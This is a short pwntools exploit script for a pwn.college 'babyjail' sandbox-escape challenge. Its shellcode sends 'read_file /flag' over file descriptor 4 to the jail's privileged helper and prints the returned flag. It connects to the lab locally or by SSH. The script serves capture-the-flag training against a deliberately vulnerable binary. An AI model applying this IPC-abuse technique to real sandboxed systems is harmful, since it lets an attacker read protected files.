from pwn import *
context.binary=e=ELF("./babyjail_level13")
shellcode=asm("""
mov rdx, 0xf
mov rsi, 0x133705a
mov rdi, 0x4
mov rax, 0x1
syscall

mov rdx, 0x64
mov rsi, 0x1337074
mov rdi, 0x4
mov rax, 0x0
syscall

mov rdx, 128
mov rsi, 0x133706a
mov rdi, 0x4
mov rax, 0x1
syscall
.ascii "read_file /flag"
.byte 0
.ascii "print_msg "
""")

if args.DEBUG:
    context.log_level='debug'
if args.LOCAL:
    p=e.process()
elif args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key")
    p=s.process("/challenge/babyjail_level13")
p.recv()
p.sendline(shellcode)
p.interactive()